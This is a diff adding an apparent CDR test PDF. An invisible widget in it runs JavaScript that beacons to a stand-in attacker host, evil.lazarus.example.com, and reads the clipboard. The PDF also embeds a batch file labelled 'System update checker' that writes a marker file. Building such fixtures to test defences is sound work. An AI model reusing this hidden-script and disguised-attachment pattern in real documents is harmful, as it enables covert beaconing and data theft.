@@ -1,0 +1,115 @@
+%PDF-1.7
+%ÂµÂ¶
+
+1 0 obj
+<</Type/Catalog/Pages 2 0 R/AcroForm<</Fields[7 0 R]>>/Names<</EmbeddedFiles<</Names[(update_check.bat)<</Type/Filespec/CI<<>>/EF<</F 12 0 R>>/F(update_check.bat)/UF(update_check.bat)/Desc(System update checker)>>]>>>>/PageMode/UseAttachments>>
+endobj
+
+2 0 obj
+<</Type/Pages/Count 1/Kids[4 0 R]>>
+endobj
+
+3 0 obj
+<</Font<</helv 5 0 R>>>>
+endobj
+
+4 0 obj
+<</Type/Page/MediaBox[0 0 595 842]/Rotate 0/Resources 3 0 R/Parent 2 0 R/Contents[6 0 R]/Annots[7 0 R]>>
+endobj
+
+5 0 obj
+<</Type/Font/Subtype/Type1/BaseFont/Helvetica/Encoding/WinAnsiEncoding>>
+endobj
+
+6 0 obj
+<</Length 660/Filter/FlateDecode>>
+stream
+xÚ­U=Õ@ìó+R#ÙõÚÎJ'
+RºÅ»¼DW@AÃïgÆ›÷!]9¢¼M¼k{<çt?»S—úWêuè½æ~úÑ½^¾ÿêSê§µ|øğmúÒıÛ¤ïR*ıô©{|ÈC»bozÓ¿Îò·K¥hYJ-«æx[‹iQ/IsÑ<Ä®cÁ“òL>ÃzÂ9<Ó®…v5<«úëÈù_Gx)(Ó’³±d‹«¸“Ãç#´ØOyğj«ƒ-3¬ùòÎ'D]Ó3nñÒ,ø=ÙÊ§¸ïÛy\‰%²¨‰
+_âõ‚sÄO?ÉË!¤nñr¬ê#"ÖÈT"ãºá´f½ÕÓöœ•Òs¡/Q!öÉ‘›İ×É(Xİ¢l^Hd&O[„»Ìà‚õ“‰†:ø#¿Ì)&ğ«Îó@ü¦†Î[Ä[õ°£H¥UøÓ5/ú	t3ªõK§<¡òèeËå"§#uJÊKÓİ¯å×¡²;„VP?ûû]£ÖÊ¼Í>—Š‡oç}Ö%Gî‘uDœõN³ÉKkã·qÊøæv­;+¢G¯œg˜Q²Ã 3†zÁ²)ÙF†PNüRDåh,·lµzkXAEteº©«¼ĞåÖª©Ú¼ß½˜qÛ4Ó6-„ü²gì•ˆy&³Â»ìÇPjäÜbàÔ	gCñ…ñUEÿàWbÀè«ÓIÙ·˜WÁi±Öm‘»°nª"Ú%¸“«ş£Ô\s=Äİufñ¿ƒî0FAwæcãû±M¯İiùÏsl'êSLáÚ‚ªŠ<_*Í.[§—83ÄÂq&+§a¨Røe:³¤w3åÒ“íYZçâ›H5­Xg­z>\Ãç©ûÚıdcÑ#
+endstream
+endobj
+
+7 0 obj
+<</Type/Annot/Subtype/Widget/FT/Btn/Ff 65537/T(hidden_payload)/NM(fitz-W0)/Rect[0 841 1 842]/F 4/BS<</S/S/W 0>>/DA(0 0 0 rg /Helv 0 Tf)/A 9 0 R/AP<</N 10 0 R/D 11 0 R>>>>
+endobj
+
+8 0 obj
+<</Length 387>>
+stream
+
+var config = {c2: "http://evil.lazarus.example.com:8080"};
+function establish_backdoor() {
+    var beacon = new XMLHttpRequest();
+    beacon.open("POST", config.c2 + "/beacon", true);
+    beacon.send(JSON.stringify({host: "VICTIM", user: "admin"}));
+}
+function keylog() { return app.getClipboard(); }
+establish_backdoor();
+app.alert("SIMULATED MALWARE EXECUTED - This is a CDR test!");
+
+endstream
+endobj
+
+9 0 obj
+<</S/JavaScript/JS 8 0 R>>
+endobj
+
+10 0 obj
+<</Type/XObject/Subtype/Form/BBox[0 0 1 1]/Matrix[1 0 0 1 0 0]/Resources<</Font<</Helv 5 0 R>>>>/Length 30>>
+stream
+q
+0 w
+BT
+0 0 0 rg
+0 0 Td
+ET
+Q
+
+endstream
+endobj
+
+11 0 obj
+<</Type/XObject/Subtype/Form/BBox[0 0 1 1]/Matrix[1 0 0 1 0 0]/Resources<</Font<</Helv 5 0 R>>>>/Length 46>>
+stream
+q
+0 w
+1 0 0 1 2 -2 cm
+BT
+0 0 0 rg
+0 0 Td
+ET
+Q
+
+endstream
+endobj
+
+12 0 obj
+<</Type/EmbeddedFile/Length 70/DL 70/Params<</Size 70/CreationDate(D:20251227191556+07'30')/ModDate(D:20251227191556+07'30')>>>>
+stream
+REM This is a simulated payload file
+echo INFECTED > C:\temp\pwned.txt
+endstream
+endobj
+
+xref
+0 13
+0000000000 65535 f 
+0000000016 00000 n 
+0000000277 00000 n 
+0000000329 00000 n 
+0000000370 00000 n 
+0000000491 00000 n 
+0000000580 00000 n 
+0000001309 00000 n 
+0000001496 00000 n 
+0000001933 00000 n 
+0000001976 00000 n 
+0000002150 00000 n 
+0000002340 00000 n 
+
+trailer
+<</Size 13/Root 1 0 R/ID[<305AC29CC2BBC2B22C1B78C2BCC28E1A><C59BDABFB4735BC7BCD7ACBE0523FDA8>]>>
+startxref
+2574
+%%EOF
